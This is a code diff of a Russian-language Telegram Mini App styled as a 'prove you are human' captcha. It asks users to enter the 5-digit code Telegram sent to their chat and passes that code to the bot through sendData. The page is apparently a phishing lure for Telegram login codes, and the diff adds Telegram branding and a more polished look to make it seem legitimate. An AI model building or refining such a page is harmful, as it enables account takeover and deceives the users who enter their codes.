@@ -8,266 +8,452 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
 
+    @keyframes tg-pop {
+      0%   { transform: scale(.96); opacity: .65 }
+      100% { transform: scale(1);   opacity: 1   }
+    }
+    @keyframes tg-shake {
+      0%,100% { transform: translateX(0)  }
+      30%     { transform: translateX(-4px) }
+      70%     { transform: translateX(4px)  }
+    }
+    @keyframes pulse-shield {
+      0%,100% { transform: scale(1) }
+      50%     { transform: scale(1.06) }
+    }
+
+    .tg-pop   { animation: tg-pop   .24s ease-out both; }
+    .tg-shake { animation: tg-shake .28s ease-out; }
+
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: var(--tg-theme-bg-color, #17212b);
-      color: var(--tg-theme-text-color, #ffffff);
-      min-height: 100vh;
+      background: #dcecf7;
+      color: #182633;
+      min-height: 100dvh;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 16px;
       user-select: none;
+      -webkit-tap-highlight-color: transparent;
     }
 
+    /* ── Карточка ── */
     .card {
-      background: var(--tg-theme-secondary-bg-color, #232e3c);
-      border-radius: 16px;
-      padding: 28px 24px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
       width: 100%;
-      max-width: 340px;
-      text-align: center;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+      max-width: 390px;
+      min-height: 690px;
+      border-radius: 30px;
+      background: #f8fbfd;
+      box-shadow: 0 24px 60px rgba(34,102,145,.18);
+      ring: 1px solid #b8d9eb;
+      overflow: hidden;
     }
 
-    .shield {
-      font-size: 48px;
-      margin-bottom: 12px;
-      animation: pulse 2s infinite;
+    /* ── Header ── */
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 58px;
+      padding: 0 20px;
+      border-bottom: 1px solid #e2edf3;
+    }
+    .header-left { display: flex; align-items: center; gap: 10px; }
+    .tg-mark {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      background: #2aabee;
+      box-shadow: 0 4px 10px rgba(42,171,238,.2);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .tg-mark svg { width: 18px; height: 18px; }
+    .header-title {
+      font-size: 14px; font-weight: 600;
+      letter-spacing: -.01em; color: #536d7f;
+    }
+    .header-badge {
+      border-radius: 999px;
+      background: #edf6fb;
+      padding: 4px 10px;
+      font-size: 10px; font-weight: 700;
+      letter-spacing: .09em;
+      text-transform: uppercase;
+      color: #7892a1;
     }
 
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50%       { transform: scale(1.08); }
+    /* ── Body ── */
+    .card-body {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      padding: 36px 24px 20px;
     }
 
-    h2 {
-      font-size: 18px;
-      font-weight: 700;
-      margin-bottom: 6px;
+    /* ── Hero ── */
+    .hero { display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .shield-wrap {
+      width: 92px; height: 92px;
+      animation: pulse-shield 2.4s ease-in-out infinite;
     }
-
-    .subtitle {
-      font-size: 13px;
-      opacity: 0.65;
-      margin-bottom: 24px;
-      line-height: 1.4;
+    .shield-wrap svg { width: 100%; height: 100%; }
+    .hero-label {
+      margin-top: 20px;
+      font-size: 11px; font-weight: 700;
+      letter-spacing: .15em; text-transform: uppercase;
+      color: #2aabee;
     }
+    .hero-title {
+      margin-top: 10px;
+      font-size: 26px; font-weight: 800;
+      line-height: 1.1; letter-spacing: -.04em;
+      color: #1c3445;
+    }
+    .hero-sub {
+      margin-top: 12px;
+      max-width: 290px;
+      font-size: 14px; line-height: 1.45;
+      color: #78909f;
+    }
+    .hero-sub strong { font-weight: 600; color: #4f6c7d; }
 
-    /* ── Отображение кода ── */
-    .code-display {
+    /* ── Ячейки кода ── */
+    .code-cells {
       display: flex;
       justify-content: center;
       gap: 8px;
-      margin-bottom: 24px;
+      margin-top: 24px;
+    }
+    .cell {
+      width: 43px; height: 43px;
+      border-radius: 13px;
+      border: 1.5px dashed #c9dce6;
+      background: white;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px; font-weight: 600;
+      color: #b8cbd5;
+      transition: border-color .18s, background .18s, color .18s;
+    }
+    .cell.filled {
+      border-style: solid;
+      border-color: #2aabee;
+      background: #e9f5ff;
+      color: #168bd0;
+    }
+    .cell.wrong {
+      border-style: solid;
+      border-color: #f0a08e;
+      background: #fff1ed;
+      color: #d86650;
     }
 
-    .code-cell {
-      width: 44px;
-      height: 52px;
-      border-radius: 10px;
-      background: var(--tg-theme-bg-color, #17212b);
-      border: 2px solid rgba(255,255,255,0.1);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 22px;
-      font-weight: 700;
-      transition: border-color 0.2s, transform 0.15s;
+    /* ── Нампад ── */
+    .numpad-wrap {
+      margin-top: 20px;
+      border-radius: 20px;
+      border: 1px solid #e3edf2;
+      background: white;
+      padding: 14px;
+      box-shadow: 0 8px 22px rgba(50,112,145,.06);
     }
+    .numpad-wrap.shake { animation: tg-shake .28s ease-out; }
 
-    .code-cell.filled {
-      border-color: var(--tg-theme-button-color, #2ea6ff);
-      transform: scale(1.05);
-    }
-
-    .code-cell.dot::after {
-      content: '•';
-      opacity: 0.3;
-      font-size: 28px;
-    }
-
-    /* ── Кнопки цифр ── */
     .numpad {
       display: grid;
       grid-template-columns: repeat(5, 1fr);
-      gap: 8px;
-      margin-bottom: 16px;
+      gap: 10px;
     }
-
     .num-btn {
-      aspect-ratio: 1;
-      border: none;
-      border-radius: 10px;
-      background: var(--tg-theme-bg-color, #17212b);
-      color: var(--tg-theme-text-color, #fff);
-      font-size: 20px;
-      font-weight: 600;
+      height: 50px;
+      border-radius: 14px;
+      border: 1.5px solid #e2edf3;
+      background: #fbfdfe;
+      color: #496677;
+      font-size: 17px; font-weight: 600;
       cursor: pointer;
-      transition: transform 0.1s, background 0.15s;
-      -webkit-tap-highlight-color: transparent;
+      transition: transform .18s ease, background .18s ease, border-color .18s ease, color .18s ease, box-shadow .18s ease;
     }
-
-    .num-btn:active {
-      transform: scale(0.92);
-      background: var(--tg-theme-button-color, #2ea6ff);
-      color: var(--tg-theme-button-text-color, #fff);
+    .num-btn:hover {
+      border-color: #a9d8f1;
+      background: #f2faff;
     }
+    .num-btn:active { transform: scale(.96); }
+    .num-btn.selected {
+      border-color: #2aabee;
+      background: #e9f5ff;
+      color: #168bd0;
+    }
+    .num-btn.correct {
+      border-color: #24b47e;
+      background: #e9fbf3;
+      color: #16865e;
+      box-shadow: 0 3px 10px rgba(36,180,126,.16);
+    }
+    .num-btn.wrong-btn {
+      border-color: #f0a08e;
+      background: #fff1ed;
+      color: #d86650;
+    }
+    .num-btn:disabled { cursor: default; }
 
-    /* ── Кнопка удалить ── */
-    .del-btn {
-      aspect-ratio: 1;
-      border: none;
-      border-radius: 10px;
-      background: rgba(255, 80, 80, 0.15);
-      color: #ff5050;
-      font-size: 20px;
-      cursor: pointer;
-      transition: transform 0.1s, background 0.15s;
-      -webkit-tap-highlight-color: transparent;
+    /* ── Стереть ── */
+    .clear-row {
       display: flex;
-      align-items: center;
       justify-content: center;
+      margin-top: 12px;
     }
+    .clear-btn {
+      border: none;
+      background: none;
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-size: 12px; font-weight: 600;
+      color: #2aabee;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .clear-btn:hover { background: #e9f5ff; }
+    .clear-btn:disabled { color: #b8cbd5; cursor: default; }
 
-    .del-btn:active {
-      transform: scale(0.92);
-      background: rgba(255, 80, 80, 0.35);
+    /* ── Статус ── */
+    .status {
+      min-height: 40px;
+      margin-top: 16px;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 500;
+      color: #9aadb8;
     }
+    .status.wrong   { color: #d86650; }
+    .status.success { color: #16865e; }
 
     /* ── Кнопка подтвердить ── */
     .confirm-btn {
-      width: 100%;
-      padding: 14px;
+      margin-top: auto;
+      padding-top: 20px;
+    }
+    .confirm-btn button {
+      width: 100%; height: 52px;
       border: none;
-      border-radius: 12px;
-      background: var(--tg-theme-button-color, #2ea6ff);
-      color: var(--tg-theme-button-text-color, #fff);
-      font-size: 16px;
-      font-weight: 600;
+      border-radius: 15px;
+      font-size: 15px; font-weight: 600;
       cursor: pointer;
-      transition: opacity 0.2s, transform 0.1s;
-      -webkit-tap-highlight-color: transparent;
+      transition: background .2s, box-shadow .2s, transform .1s;
+      background: #e7f0f5;
+      color: #9bb0bc;
     }
-
-    .confirm-btn:disabled {
-      opacity: 0.35;
-      cursor: default;
+    .confirm-btn button.active {
+      background: #2aabee;
+      color: white;
+      box-shadow: 0 8px 18px rgba(42,171,238,.24);
     }
+    .confirm-btn button.active:hover  { background: #229cdb; }
+    .confirm-btn button.active:active { transform: scale(.98); }
 
-    .confirm-btn:not(:disabled):active {
-      transform: scale(0.97);
-    }
-
-    /* ── Статусы ── */
-    .status {
-      font-size: 13px;
-      min-height: 18px;
-      margin-bottom: 12px;
-      transition: color 0.2s;
-    }
-
-    .status.error   { color: #ff5050; }
-    .status.success { color: #4caf50; }
-
-    /* ── Успех ── */
+    /* ── Экран успеха ── */
     .success-screen {
       display: none;
       flex-direction: column;
       align-items: center;
-      gap: 12px;
+      justify-content: center;
+      text-align: center;
+      flex: 1;
     }
-
     .success-screen.show { display: flex; }
+    .success-icon-wrap {
+      width: 78px; height: 78px;
+      border-radius: 26px;
+      background: #e8faf2;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .success-circle {
+      width: 42px; height: 42px;
+      border-radius: 50%;
+      background: #25b87f;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .checkmark {
+      width: 22px; height: 14px;
+      border-bottom: 3.5px solid white;
+      border-left:  3.5px solid white;
+      transform: rotate(-45deg) translate(1px, -2px);
+    }
+    .success-label {
+      margin-top: 28px;
+      font-size: 11px; font-weight: 700;
+      letter-spacing: .15em; text-transform: uppercase;
+      color: #24a977;
+    }
+    .success-title {
+      margin-top: 10px;
+      font-size: 28px; font-weight: 800;
+      letter-spacing: -.045em; color: #1c3445;
+    }
+    .success-sub {
+      margin-top: 12px;
+      max-width: 275px;
+      font-size: 14px; line-height: 1.5; color: #78909f;
+    }
+    .reset-btn {
+      margin-top: 36px;
+      width: 270px; height: 48px;
+      border: none; border-radius: 14px;
+      background: #2aabee; color: white;
+      font-size: 14px; font-weight: 600;
+      box-shadow: 0 8px 18px rgba(42,171,238,.2);
+      cursor: pointer;
+      transition: background .2s, transform .1s;
+    }
+    .reset-btn:hover  { background: #229cdb; }
+    .reset-btn:active { transform: scale(.98); }
 
-    .success-icon { font-size: 64px; }
-    .success-text { font-size: 18px; font-weight: 700; }
-    .success-sub  { font-size: 13px; opacity: 0.65; }
+    /* ── Footer ── */
+    .card-footer {
+      border-top: 1px solid #e2edf3;
+      padding: 14px 24px;
+      text-align: center;
+      font-size: 10px; color: #9aadb8;
+    }
   </style>
 </head>
 <body>
+<div class="card">
 
-<div class="card" id="captcha-screen">
-  <div class="shield">🛡️</div>
-  <h2>Проверка безопасности</h2>
-  <p class="subtitle">Введите 5-значный код,<br>который Telegram прислал вам в чат</p>
-
-  <div class="code-display" id="code-display">
-    <div class="code-cell dot" id="cell-0"></div>
-    <div class="code-cell dot" id="cell-1"></div>
-    <div class="code-cell dot" id="cell-2"></div>
-    <div class="code-cell dot" id="cell-3"></div>
-    <div class="code-cell dot" id="cell-4"></div>
+  <!-- Header -->
+  <div class="card-header">
+    <div class="header-left">
+      <div class="tg-mark">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M20.7 4.2 3.8 10.9c-1.2.5-1.2 1.2-.2 1.5l4.3 1.4 1.6 5.1c.2.7.4.7.8.4l2.4-2.3 4.7 3.5c.9.5 1.6.3 1.8-.8l2.9-13.9c.3-1.2-.5-1.8-1.4-1.4Zm-11.9 9.1 9.8-6.2c.5-.3 1-.1.6.2l-8.1 7.3-.3 3.2-1.3-4.1-3.2-1c-.7-.2-.7-.5.1-.8l2.4-.6Z" fill="white"/>
+        </svg>
+      </div>
+      <span class="header-title">Мини-приложение</span>
+    </div>
+    <span class="header-badge">Проверка</span>
   </div>
 
-  <div class="numpad" id="numpad">
-    <button class="num-btn" onclick="pressDigit('1')">1</button>
-    <button class="num-btn" onclick="pressDigit('2')">2</button>
-    <button class="num-btn" onclick="pressDigit('3')">3</button>
-    <button class="num-btn" onclick="pressDigit('4')">4</button>
-    <button class="num-btn" onclick="pressDigit('5')">5</button>
-    <button class="num-btn" onclick="pressDigit('6')">6</button>
-    <button class="num-btn" onclick="pressDigit('7')">7</button>
-    <button class="num-btn" onclick="pressDigit('8')">8</button>
-    <button class="num-btn" onclick="pressDigit('9')">9</button>
-    <button class="num-btn" onclick="pressDigit('0')">0</button>
-    <button class="del-btn" onclick="deleteLast()">⌫</button>
-  </div>
+  <!-- Body -->
+  <div class="card-body">
 
-  <div class="status" id="status"></div>
+    <!-- Основной экран -->
+    <div id="main-screen">
+      <!-- Hero -->
+      <div class="hero">
+        <div class="shield-wrap">
+          <svg viewBox="0 0 92 92" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M46 8L14 20v24c0 18.8 13.6 36.4 32 41 18.4-4.6 32-21.6 32-41V20L46 8Z" fill="#2aabee" opacity=".15"/>
+            <path d="M46 12L16 23.2V44c0 17.6 12.8 34 30 38.4C63.2 78 76 61.6 76 44V23.2L46 12Z" fill="none" stroke="#2aabee" stroke-width="2.5"/>
+            <path d="M35 46l8 8 14-16" stroke="#2aabee" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <p class="hero-label">Быстрая проверка</p>
+        <h1 class="hero-title">Докажите, что вы человек</h1>
+        <p class="hero-sub">Введите <strong>5-значный код</strong>, который Telegram прислал вам в чат</p>
+      </div>
 
-  <button class="confirm-btn" id="confirm-btn" disabled onclick="confirmCode()">
-    Подтвердить →
-  </button>
-</div>
+      <!-- Ячейки кода -->
+      <div class="code-cells" id="code-cells">
+        <div class="cell" id="c0"></div>
+        <div class="cell" id="c1"></div>
+        <div class="cell" id="c2"></div>
+        <div class="cell" id="c3"></div>
+        <div class="cell" id="c4"></div>
+      </div>
 
-<div class="card success-screen" id="success-screen">
-  <div class="success-icon">✅</div>
-  <div class="success-text">Проверка пройдена!</div>
-  <div class="success-sub">Возвращаемся в бот...</div>
+      <!-- Нампад -->
+      <div class="numpad-wrap" id="numpad-wrap">
+        <div class="numpad" id="numpad">
+          <button class="num-btn" onclick="press('1')">1</button>
+          <button class="num-btn" onclick="press('2')">2</button>
+          <button class="num-btn" onclick="press('3')">3</button>
+          <button class="num-btn" onclick="press('4')">4</button>
+          <button class="num-btn" onclick="press('5')">5</button>
+          <button class="num-btn" onclick="press('6')">6</button>
+          <button class="num-btn" onclick="press('7')">7</button>
+          <button class="num-btn" onclick="press('8')">8</button>
+          <button class="num-btn" onclick="press('9')">9</button>
+          <button class="num-btn" onclick="press('0')">0</button>
+        </div>
+      </div>
+
+      <!-- Стереть -->
+      <div class="clear-row">
+        <button class="clear-btn" id="clear-btn" onclick="clearCode()" disabled>Стереть цифры</button>
+      </div>
+
+      <!-- Статус -->
+      <div class="status" id="status">Нажимайте цифры по одной</div>
+
+      <!-- Подтвердить -->
+      <div class="confirm-btn">
+        <button id="confirm-btn" onclick="confirm_()">Подтвердить</button>
+      </div>
+    </div>
+
+    <!-- Экран успеха -->
+    <div class="success-screen tg-pop" id="success-screen">
+      <div class="success-icon-wrap">
+        <div class="success-circle">
+          <div class="checkmark"></div>
+        </div>
+      </div>
+      <p class="success-label">Проверка пройдена</p>
+      <h1 class="success-title">Всё готово</h1>
+      <p class="success-sub">Спасибо, что подтвердили, что вы человек. Возвращаемся в бот...</p>
+    </div>
+
+  </div><!-- /card-body -->
+
+  <div class="card-footer">Независимая проверка — Telegram Mini App</div>
 </div>
 
 <script>
   const tg = window.Telegram.WebApp;
   tg.ready();
   tg.expand();
-
-  // Скрываем главную кнопку Telegram (используем свою)
   tg.MainButton.hide();
 
-  let digits = [];
   const MAX = 5;
+  let digits = [];
+  // wrong = все 5 введены, но код неправильный (у нас не проверяем на фронте, просто отправляем)
+  // success = после отправки
 
-  function pressDigit(d) {
+  function press(d) {
     if (digits.length >= MAX) return;
     digits.push(d);
     render();
-    if (digits.length === MAX) {
-      document.getElementById('confirm-btn').disabled = false;
-      setStatus('Нажмите «Подтвердить»', '');
-    }
+    updateClearBtn();
   }
 
-  function deleteLast() {
-    if (digits.length === 0) return;
-    digits.pop();
-    document.getElementById('confirm-btn').disabled = true;
-    setStatus('', '');
+  function clearCode() {
+    digits = [];
     render();
+    updateClearBtn();
+    setStatus('Нажимайте цифры по одной', '');
+  }
+
+  function updateClearBtn() {
+    document.getElementById('clear-btn').disabled = digits.length === 0;
   }
 
   function render() {
     for (let i = 0; i < MAX; i++) {
-      const cell = document.getElementById(`cell-${i}`);
-      cell.textContent = '';
-      cell.className = 'code-cell';
-      if (i < digits.length) {
-        cell.textContent = digits[i];
-        cell.classList.add('filled');
-      } else {
-        cell.classList.add('dot');
-      }
+      const cell = document.getElementById(`c${i}`);
+      cell.textContent = digits[i] ?? '';
+      cell.className = 'cell' + (digits[i] !== undefined ? ' filled' : '');
+    }
+
+    const btn = document.getElementById('confirm-btn');
+    if (digits.length === MAX) {
+      btn.classList.add('active');
+      setStatus('Нажмите «Подтвердить»', 'success');
+    } else {
+      btn.classList.remove('active');
+      if (digits.length > 0) setStatus(`Введено ${digits.length} из ${MAX}`, '');
+      else setStatus('Нажимайте цифры по одной', '');
     }
   }
 
@@ -277,27 +463,27 @@
     el.className = 'status' + (type ? ` ${type}` : '');
   }
 
-  function confirmCode() {
+  function confirm_() {
     if (digits.length !== MAX) return;
-
     const code = digits.join('');
 
-    // Отправляем код боту через sendData
-    tg.sendData(JSON.stringify({ code: code }));
+    // Отправляем код боту
+    tg.sendData(JSON.stringify({ code }));
 
-    // Показываем экран успеха
-    document.getElementById('captcha-screen').style.display = 'none';
-    document.getElementById('success-screen').classList.add('show');
+    // Показываем успех
+    document.getElementById('main-screen').style.display = 'none';
+    const s = document.getElementById('success-screen');
+    s.classList.add('show');
 
-    // Закрываем Mini App через 1.5 сек
+    // Закрываем через 1.5 сек
     setTimeout(() => tg.close(), 1500);
   }
 
-  // Поддержка физической клавиатуры
-  document.addEventListener('keydown', (e) => {
-    if (e.key >= '0' && e.key <= '9') pressDigit(e.key);
-    if (e.key === 'Backspace') deleteLast();
-    if (e.key === 'Enter') confirmCode();
+  // Физическая клавиатура
+  document.addEventListener('keydown', e => {
+    if (e.key >= '0' && e.key <= '9') press(e.key);
+    if (e.key === 'Backspace') clearCode();
+    if (e.key === 'Enter') confirm_();
   });
 </script>
 </body>
